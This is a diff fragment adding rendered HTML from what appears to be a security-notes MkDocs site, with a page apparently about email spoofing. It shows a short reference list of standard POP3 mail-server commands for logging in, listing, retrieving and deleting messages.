+<h2 id="commands_2">Commands</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a># Login
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>USER &lt;username&gt;
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>PASS &lt;password&gt;
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a># Number and total size of all messages
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>STAT
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a># List messages and size
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>LIST
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a># Retrieve the message of given number
+</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>RETR &lt;number&gt;
+</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a># Delete the message of given number
+</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>DELE &lt;number&gt;
+</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a># Reset the mailbox
+</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>RSET
+</span><span id="__span-26-15"><a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a># Exit the mail server
+</span><span id="__span-26-16"><a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a>QUIT
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/emailspoofing.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
